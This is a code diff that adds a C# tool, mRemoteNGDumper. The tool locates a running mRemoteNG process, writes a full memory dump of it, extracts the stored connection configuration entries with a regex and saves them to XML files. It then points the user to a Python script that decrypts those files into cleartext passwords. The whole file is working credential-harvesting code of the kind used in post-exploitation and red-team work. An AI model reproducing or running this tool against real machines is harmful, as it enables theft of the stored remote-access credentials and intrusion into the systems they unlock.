@@ -1,0 +1,122 @@
+﻿using System;
+using System.Collections;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Text.RegularExpressions;
+
+
+namespace mRemoteNGDumper
+{
+    public static class Program
+    {
+
+        public enum MINIDUMP_TYPE
+        {
+            MiniDumpWithFullMemory = 0x00000002
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 4)]
+        public struct MINIDUMP_EXCEPTION_INFORMATION
+        {
+            public uint ThreadId;
+            public IntPtr ExceptionPointers;
+            public int ClientPointers;
+        }
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+        [DllImport("Dbghelp.dll")]
+        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, SafeHandle hFile, MINIDUMP_TYPE DumpType, ref MINIDUMP_EXCEPTION_INFORMATION ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
+
+      
+        static void Main(string[] args)
+        {
+            string input;
+            bool configfound = false;
+            StringBuilder filesb;
+            StringBuilder linesb;
+            List<string> configs = new List<string>();
+
+            Process[] localByName = Process.GetProcessesByName("mRemoteNG");
+
+            if (localByName.Length == 0) {
+                Console.WriteLine("[-] No mRemoteNG process was found. Exiting");
+                System.Environment.Exit(1);
+            }
+            string assemblyPath = Assembly.GetEntryAssembly().Location;
+            Console.WriteLine("[+] Creating a memory dump of mRemoteNG using PID {0}.", localByName[0].Id);
+            string dumpFileName = assemblyPath + "_" + DateTime.Now.ToString("dd.MM.yyyy.HH.mm.ss") + ".dmp";
+            FileStream procdumpFileStream = File.Create(dumpFileName);
+            MINIDUMP_EXCEPTION_INFORMATION info = new MINIDUMP_EXCEPTION_INFORMATION();
+
+            // A full memory dump is necessary in the case of a managed application, other wise no information
+            // regarding the managed code will be available
+            MINIDUMP_TYPE DumpType = MINIDUMP_TYPE.MiniDumpWithFullMemory;
+            MiniDumpWriteDump(localByName[0].Handle, (uint)localByName[0].Id, procdumpFileStream.SafeFileHandle, DumpType, ref info, IntPtr.Zero, IntPtr.Zero);
+            procdumpFileStream.Close();
+
+            filesb = new StringBuilder();
+            Console.WriteLine("[+] Searching for configuration files in memory dump.");
+            using (StreamReader reader = new StreamReader(dumpFileName))
+            {
+                while (reader.Peek() >= 0)
+                {
+                    input = reader.ReadLine();
+                    string pattern = @"(\<Node)(.*)(?=\/>)\/>";
+                    Match m = Regex.Match(input, pattern, RegexOptions.IgnoreCase);
+                    if (m.Success)
+                    {
+                        configfound = true;
+
+                        foreach (string config in m.Value.Split('>'))
+                        {
+                            configs.Add(config);
+                        }
+                    }
+                    
+                }
+
+                reader.Close();
+                if (configfound)
+                {
+                    string currentDir = System.IO.Directory.GetCurrentDirectory();
+                    string dumpdir = currentDir + "/dump";
+                    if (!Directory.Exists(dumpdir))
+                    {
+                        Directory.CreateDirectory(dumpdir);
+                    }
+
+                    string savefilepath;
+                    for (int i =0; i < configs.Count;i++)
+                    {
+                        if (!string.IsNullOrEmpty(configs[i])) 
+                        {
+                            savefilepath = currentDir + "\\dump\\extracted_Configfile_mRemoteNG_" + i+"_" + DateTime.Now.ToString("dd.MM.yyyy.HH.mm") + "_confCons.xml";
+                            Console.WriteLine("[+] Saving extracted configuration file to: " + savefilepath);
+                            using (StreamWriter writer = new StreamWriter(savefilepath))
+                            {
+                                writer.Write(configs[i]+'>');
+                                writer.Close();
+                            }
+                        } 
+                    }
+                    Console.WriteLine("[+] Done!");
+                    Console.WriteLine("[+] Deleting memorydump file!");
+                    File.Delete(dumpFileName);
+                    Console.WriteLine("[+] To decrypt mRemoteNG configuration files and get passwords in cleartext, execute: mremoteng_decrypt.py\r\n Example: python3 mremoteng_decrypt.py -rf \""+ currentDir + "\\dump\\extracted_Configfile_mRemoteNG_0_" + DateTime.Now.ToString("dd.MM.yyyy.HH.mm") + "_confCons.xml\"" );
+                }
+                else
+                {
+                    Console.WriteLine("[-] No configuration file found in memorydump. Exiting");
+                    Console.WriteLine("[+] Deleting memorydump file!");
+                    File.Delete(dumpFileName);
+                }
+            }
+        }
+    }
+}
